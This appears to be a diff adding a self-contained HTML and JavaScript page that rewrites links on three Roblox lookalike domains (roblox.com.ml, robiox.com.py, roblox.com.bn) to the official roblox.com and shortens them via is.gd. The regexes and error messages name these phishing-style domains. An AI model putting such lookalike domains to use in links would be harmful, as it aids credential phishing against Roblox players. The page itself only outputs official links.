@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Link Converter & Shortener</title>
+    <style>
+        :root {
+            --bg: #000000;
+            --card-bg: #0d0d0d;
+            --red-glow: rgba(220, 20, 20, 0.45);
+            --red-glow-strong: rgba(255, 30, 30, 0.6);
+            --text: #e0e0e0;
+            --text-muted: #999;
+            --input-bg: #1a1a1a;
+            --input-border: #2a2a2a;
+            --gradient-white: #ffffff;
+            --gradient-red: #e63946;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg);
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .bg-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .bg-particles .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 40, 40, 0.06);
+            animation: floatUp linear infinite;
+        }
+        @keyframes floatUp {
+            0% {
+                transform: translateY(100vh) scale(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-10vh) scale(1.5);
+                opacity: 0;
+            }
+        }
+
+        .main-container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 600px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 40px 32px;
+            position: relative;
+            border: 1px solid rgba(255, 40, 40, 0.15);
+            box-shadow:
+                0 0 30px var(--red-glow),
+                0 0 60px rgba(220, 20, 20, 0.2),
+                0 0 100px rgba(220, 20, 20, 0.08),
+                0 0 200px rgba(220, 20, 20, 0.04);
+            animation: glowPulse 3.5s ease-in-out infinite;
+            transition: all 0.4s ease;
+        }
+        .card:hover {
+            box-shadow:
+                0 0 40px var(--red-glow-strong),
+                0 0 80px rgba(255, 30, 30, 0.3),
+                0 0 140px rgba(220, 20, 20, 0.12),
+                0 0 240px rgba(220, 20, 20, 0.06);
+        }
+        @keyframes glowPulse {
+            0%,
+            100% {
+                box-shadow: 0 0 30px var(--red-glow), 0 0 60px rgba(220, 20, 20, 0.2), 0 0 100px rgba(220, 20, 20, 0.08), 0 0 200px rgba(220, 20, 20, 0.04);
+            }
+            35% {
+                box-shadow: 0 0 45px rgba(255, 35, 35, 0.55), 0 0 75px rgba(220, 20, 20, 0.28), 0 0 120px rgba(220, 20, 20, 0.13), 0 0 220px rgba(220, 20, 20, 0.07);
+            }
+            70% {
+                box-shadow: 0 0 32px var(--red-glow), 0 0 65px rgba(220, 20, 20, 0.22), 0 0 105px rgba(220, 20, 20, 0.09), 0 0 205px rgba(220, 20, 20, 0.05);
+            }
+        }
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), #e63946, rgba(255, 255, 255, 0.7), transparent);
+            border-radius: 0 0 50% 50%;
+            opacity: 0.8;
+        }
+
+        .title {
+            font-size: 2rem;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #ffffff 0%, #f0f0f0 30%, #e63946 70%, #c0392b 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 18px rgba(230, 57, 70, 0.5));
+        }
+        .subtitle {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+            letter-spacing: 0.3px;
+            font-weight: 400;
+        }
+        .subtitle span {
+            color: #e63946;
+            font-weight: 600;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .input-wrapper {
+            flex: 1;
+            min-width: 240px;
+            position: relative;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 18px 14px 42px;
+            background: var(--input-bg);
+            border: 2px solid var(--input-border);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 0.95rem;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        .input-wrapper input::placeholder {
+            color: #555;
+            font-size: 0.85rem;
+        }
+        .input-wrapper input:focus {
+            border-color: #e63946;
+            box-shadow: 0 0 20px rgba(230, 57, 70, 0.25), 0 0 0 4px rgba(230, 57, 70, 0.06);
+            background: #1c1c1c;
+        }
+        .input-wrapper .icon-left {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+            transition: color 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .input-wrapper .icon-left svg {
+            width: 18px;
+            height: 18px;
+            color: #666;
+            transition: color 0.3s ease;
+        }
+        .input-wrapper input:focus~.icon-left svg {
+            color: #e63946;
+        }
+
+        .btn-generate {
+            padding: 14px 24px;
+            background: linear-gradient(135deg, #ffffff 0%, #f5f5f5 20%, #e63946 65%, #c0392b 100%);
+            color: #0a0a0a;
+            font-weight: 700;
+            font-size: 0.95rem;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            transition: all 0.35s ease;
+            white-space: nowrap;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(230, 57, 70, 0.3);
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn-generate:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(230, 57, 70, 0.45), 0 0 50px rgba(230, 57, 70, 0.2);
+            background: linear-gradient(135deg, #ffffff 0%, #fafafa 15%, #ff4d5a 60%, #d63031 100%);
+        }
+        .btn-generate:active {
+            transform: translateY(0) scale(0.97);
+            box-shadow: 0 2px 12px rgba(230, 57, 70, 0.3);
+            transition: all 0.1s ease;
+        }
+        .btn-generate:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 2px 10px rgba(230, 57, 70, 0.15);
+        }
+        .btn-generate .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(0, 0, 0, 0.3);
+            border-top-color: #0a0a0a;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        .btn-generate.loading .spinner {
+            display: inline-block;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .result-area {
+            display: none;
+            margin-top: 20px;
+            padding: 18px 20px;
+            background: #111;
+            border-radius: 12px;
+            border: 1px solid rgba(230, 57, 70, 0.2);
+            animation: fadeInUp 0.4s ease;
+        }
+        .result-area.visible {
+            display: block;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .result-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #888;
+            margin-bottom: 8px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .result-label svg {
+            width: 14px;
+            height: 14px;
+            color: #888;
+        }
+
+        .result-link-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 10px 14px;
+            border: 1px solid #2a2a2a;
+            flex-wrap: wrap;
+        }
+        .result-link {
+            flex: 1;
+            color: #ff5555;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.9rem;
+            word-break: break-all;
+            letter-spacing: 0.2px;
+            transition: color 0.2s ease;
+            min-width: 180px;
+        }
+        .result-link:hover {
+            color: #ff7777;
+            text-decoration: underline;
+        }
+
+        .btn-copy {
+            padding: 8px 14px;
+            background: rgba(230, 57, 70, 0.15);
+            color: #ff6666;
+            border: 1px solid rgba(230, 57, 70, 0.3);
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.8rem;
+            letter-spacing: 0.3px;
+            transition: all 0.25s ease;
+            white-space: nowrap;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .btn-copy svg {
+            width: 16px;
+            height: 16px;
+            color: #ff6666;
+            transition: color 0.25s ease;
+            flex-shrink: 0;
+        }
+        .btn-copy:hover {
+            background: rgba(230, 57, 70, 0.25);
+            border-color: rgba(230, 57, 70, 0.5);
+            color: #ff8888;
+        }
+        .btn-copy:hover svg {
+            color: #ff8888;
+        }
+        .btn-copy.copied {
+            background: rgba(40, 167, 69, 0.2);
+            border-color: rgba(40, 167, 69, 0.4);
+            color: #4ade80;
+        }
+        .btn-copy.copied svg {
+            color: #4ade80;
+        }
+        @keyframes copyPulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.08);
+            }
+        }
+
+        .original-url {
+            margin-top: 10px;
+            font-size: 0.75rem;
+            color: #666;
+            word-break: break-all;
+            letter-spacing: 0.2px;
+        }
+        .original-url strong {
+            color: #999;
+            font-weight: 500;
+        }
+
+        .error-message {
+            display: none;
+            margin-top: 14px;
+            padding: 12px 16px;
+            background: rgba(230, 57, 70, 0.1);
+            border: 1px solid rgba(230, 57, 70, 0.3);
+            border-radius: 10px;
+            color: #ff6666;
+            font-size: 0.85rem;
+            animation: fadeInUp 0.3s ease;
+            letter-spacing: 0.2px;
+            align-items: flex-start;
+            gap: 10px;
+            line-height: 1.5;
+        }
+        .error-message.visible {
+            display: flex;
+        }
+        .error-message svg {
+            width: 18px;
+            height: 18px;
+            color: #ff6666;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 0.7rem;
+            color: #444;
+            letter-spacing: 0.3px;
+        }
+        .footer-note a {
+            color: #666;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .footer-note a:hover {
+            color: #e63946;
+        }
+
+        @media (max-width: 500px) {
+            .card {
+                padding: 28px 18px;
+                border-radius: 16px;
+            }
+            .title {
+                font-size: 1.5rem;
+            }
+            .subtitle {
+                font-size: 0.78rem;
+                margin-bottom: 20px;
+            }
+            .input-group {
+                flex-direction: column;
+                gap: 10px;
+            }
+            .btn-generate {
+                width: 100%;
+                padding: 14px 20px;
+                font-size: 0.9rem;
+                justify-content: center;
+            }
+            .input-wrapper input {
+                padding: 12px 14px 12px 38px;
+                font-size: 0.85rem;
+            }
+            .input-wrapper .icon-left svg {
+                width: 16px;
+                height: 16px;
+            }
+            .result-link-container {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .btn-copy {
+                text-align: center;
+                padding: 10px;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-particles" id="particles"></div>
+
+    <div class="main-container">
+        <div class="card">
+            <h1 class="title">Roblox Link Converter</h1>
+            <p class="subtitle">
+                Paste a link with <span>roblox.com.ml</span> / <span>robiox.com.py</span> / <span>roblox.com.bn</span>
+            </p>
+
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <span class="icon-left">
+                        <!-- Link icon SVG -->
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+                            <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
+                        </svg>
+                    </span>
+                    <input type="text" id="urlInput" placeholder="e.g. roblox.com.bn/users/8230912/profile" autocomplete="off" spellcheck="false">
+                </div>
+                <button class="btn-generate" id="btnGenerate" onclick="handleConvert()">
+                    <span class="spinner"></span>
+                    <span class="btn-text">Generate Link</span>
+                </button>
+            </div>
+
+            <div class="result-area" id="resultArea">
+                <div class="result-label">
+                    <!-- Link icon small -->
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+                        <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
+                    </svg>
+                    Shortened Link (is.gd)
+                </div>
+                <div class="result-link-container">
+                    <a href="#" class="result-link" id="resultLink" target="_blank" rel="noopener noreferrer"></a>
+                    <button class="btn-copy" id="btnCopy" onclick="copyLink()">
+                        <!-- Copy SVG -->
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
+                            <path d="M768 832a128 128 0 0 1-128 128H192A128 128 0 0 1 64 832V384a128 128 0 0 1 128-128v64a64 64 0 0 0-64 64v448a64 64 0 0 0 64 64h448a64 64 0 0 0 64-64h64z"/>
+                            <path d="M384 128a64 64 0 0 0-64 64v448a64 64 0 0 0 64 64h448a64 64 0 0 0 64-64V192a64 64 0 0 0-64-64H384zm0-64h448a128 128 0 0 1 128 128v448a128 128 0 0 1-128 128H384a128 128 0 0 1-128-128V192A128 128 0 0 1 384 64z"/>
+                        </svg>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <div class="original-url" id="originalUrlDisplay"></div>
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                <!-- Warning triangle SVG -->
+                <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
+                    <path d="M520.741 163.801a10.234 10.234 0 00-3.406-3.406c-4.827-2.946-11.129-1.421-14.075 3.406L80.258 856.874a10.236 10.236 0 00-1.499 5.335c0 5.655 4.585 10.24 10.24 10.24h846.004c1.882 0 3.728-.519 5.335-1.499 4.827-2.946 6.352-9.248 3.406-14.075L520.742 163.802zm43.703-26.674L987.446 830.2c17.678 28.964 8.528 66.774-20.436 84.452a61.445 61.445 0 01-32.008 8.996H88.998c-33.932 0-61.44-27.508-61.44-61.44a61.445 61.445 0 018.996-32.008l423.002-693.073c17.678-28.964 55.488-38.113 84.452-20.436a61.438 61.438 0 0120.436 20.436zM512 778.24c22.622 0 40.96-18.338 40.96-40.96s-18.338-40.96-40.96-40.96-40.96 18.338-40.96 40.96 18.338 40.96 40.96 40.96zm0-440.32c-22.622 0-40.96 18.338-40.96 40.96v225.28c0 22.622 18.338 40.96 40.96 40.96s40.96-18.338 40.96-40.96V378.88c0-22.622-18.338-40.96-40.96-40.96z"/>
+                </svg>
+                <span id="errorText"></span>
+            </div>
+        </div>
+        <p class="footer-note">
+            Converts fake Roblox domains → official <a href="https://www.roblox.com" target="_blank" rel="noopener">roblox.com</a> & shortens via <a href="https://is.gd" target="_blank" rel="noopener">is.gd</a>
+        </p>
+    </div>
+
+    <script>
+        (function createParticles() {
+            const container = document.getElementById('particles');
+            const count = 30;
+            for (let i = 0; i < count; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                const size = Math.random() * 3 + 1.5;
+                particle.style.width = size + 'px';
+                particle.style.height = size + 'px';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDuration = Math.random() * 18 + 10 + 's';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                container.appendChild(particle);
+            }
+        })();
+
+        const urlInput = document.getElementById('urlInput');
+        const btnGenerate = document.getElementById('btnGenerate');
+        const resultArea = document.getElementById('resultArea');
+        const resultLink = document.getElementById('resultLink');
+        const btnCopy = document.getElementById('btnCopy');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorText = document.getElementById('errorText');
+        const originalUrlDisplay = document.getElementById('originalUrlDisplay');
+
+        urlInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleConvert();
+            }
+        });
+
+        async function handleConvert() {
+            const rawInput = urlInput.value.trim();
+            resultArea.classList.remove('visible');
+            errorMessage.classList.remove('visible');
+            btnCopy.classList.remove('copied');
+            btnCopy.querySelector('span').textContent = 'Copy';
+
+            if (!rawInput) {
+                showError('Please paste a URL containing one of the fake domains (roblox.com.ml, robiox.com.py, or roblox.com.bn).');
+                urlInput.focus();
+                return;
+            }
+
+            const hasFakeDomain = /roblox\.com\.(ml|bn)/i.test(rawInput) || /robiox\.com\.py/i.test(rawInput);
+            if (!hasFakeDomain) {
+                showError('The URL must contain one of these fake domains:<br>• <strong>roblox.com.ml</strong><br>• <strong>robiox.com.py</strong><br>• <strong>roblox.com.bn</strong>');
+                urlInput.focus();
+                return;
+            }
+
+            const correctedUrl = correctUrl(rawInput);
+            if (!correctedUrl) {
+                showError('Could not parse the URL. Please check the format and try again.');
+                return;
+            }
+
+            setLoading(true);
+            errorMessage.classList.remove('visible');
+            resultArea.classList.remove('visible');
+
+            try {
+                const shortenedUrl = await shortenWithIsGd(correctedUrl);
+                resultLink.href = shortenedUrl;
+                resultLink.textContent = shortenedUrl;
+                originalUrlDisplay.innerHTML = '<strong>Original corrected URL:</strong> ' + escapeHtml(correctedUrl);
+                resultArea.classList.add('visible');
+                btnCopy.querySelector('span').textContent = 'Copy';
+                btnCopy.classList.remove('copied');
+                resultArea.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            } catch (err) {
+                console.error('Shortening error:', err);
+                resultLink.href = correctedUrl;
+                resultLink.textContent = correctedUrl;
+                originalUrlDisplay.innerHTML = '<strong>Shortening failed. Corrected URL:</strong> ' + escapeHtml(correctedUrl);
+                resultArea.classList.add('visible');
+                showError('Could not shorten the link via is.gd (API may be unavailable). The corrected roblox.com URL is shown above.');
+                btnCopy.querySelector('span').textContent = 'Copy';
+                btnCopy.classList.remove('copied');
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        function correctUrl(input) {
+            let url = input.trim();
+            if (!/^https?:\/\//i.test(url)) {
+                url = 'https://' + url;
+            }
+            url = url.replace(/roblox\.com\.(ml|bn)/gi, 'roblox.com');
+            url = url.replace(/robiox\.com\.py/gi, 'roblox.com');
+            try {
+                let urlObj = new URL(url);
+                if (urlObj.hostname.includes('roblox.com')) {
+                    urlObj.hostname = 'www.roblox.com';
+                }
+                url = urlObj.toString();
+            } catch (e) {
+                url = url.replace(/(?:https?:\/\/)?(?:www\.)?roblox\.com/i, 'https://www.roblox.com');
+                url = url.replace(/https:\/\/https:\/\//i, 'https://');
+            }
+            url = url.replace(/^(https:\/\/)+/i, 'https://');
+            return url;
+        }
+
+        async function shortenWithIsGd(longUrl) {
+            const apiUrl = 'https://is.gd/create.php?format=simple&url=' + encodeURIComponent(longUrl);
+            const response = await fetch(apiUrl, {
+                method: 'GET',
+                headers: { 'Accept': 'text/plain' },
+            });
+            if (!response.ok) throw new Error('is.gd API returned status ' + response.status);
+            const text = await response.text();
+            if (text.startsWith('https://is.gd/') || text.startsWith('http://is.gd/')) {
+                return text.trim();
+            } else if (text.startsWith('https://') || text.startsWith('http://')) {
+                return text.trim();
+            } else {
+                throw new Error('is.gd API error: ' + text.trim());
+            }
+        }
+
+        function copyLink() {
+            const linkToCopy = resultLink.textContent || resultLink.href;
+            if (!linkToCopy) return;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(linkToCopy).then(() => showCopySuccess()).catch(() => fallbackCopy(linkToCopy));
+            } else {
+                fallbackCopy(linkToCopy);
+            }
+        }
+
+        function fallbackCopy(text) {
+            const tempInput = document.createElement('textarea');
+            tempInput.value = text;
+            tempInput.style.position = 'fixed';
+            tempInput.style.left = '-9999px';
+            tempInput.style.top = '-9999px';
+            document.body.appendChild(tempInput);
+            tempInput.focus();
+            tempInput.select();
+            try { document.execCommand('copy');
+                showCopySuccess(); } catch (err) { showError('Failed to copy. Please manually select and copy the link.'); }
+            document.body.removeChild(tempInput);
+        }
+
+        function showCopySuccess() {
+            btnCopy.querySelector('span').textContent = 'Copied!';
+            btnCopy.classList.add('copied');
+            setTimeout(() => {
+                btnCopy.querySelector('span').textContent = 'Copy';
+                btnCopy.classList.remove('copied');
+            }, 2200);
+        }
+
+        function showError(msg) {
+            errorText.innerHTML = msg;
+            errorMessage.classList.add('visible');
+            errorMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+
+        function setLoading(isLoading) {
+            if (isLoading) {
+                btnGenerate.disabled = true;
+                btnGenerate.classList.add('loading');
+                btnGenerate.querySelector('.btn-text').textContent = 'Shortening...';
+            } else {
+                btnGenerate.disabled = false;
+                btnGenerate.classList.remove('loading');
+                btnGenerate.querySelector('.btn-text').textContent = 'Generate Link';
+            }
+        }
+
+        function escapeHtml(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        setTimeout(() => { urlInput.focus(); }, 500);
+    </script>
+</body>
+</html>
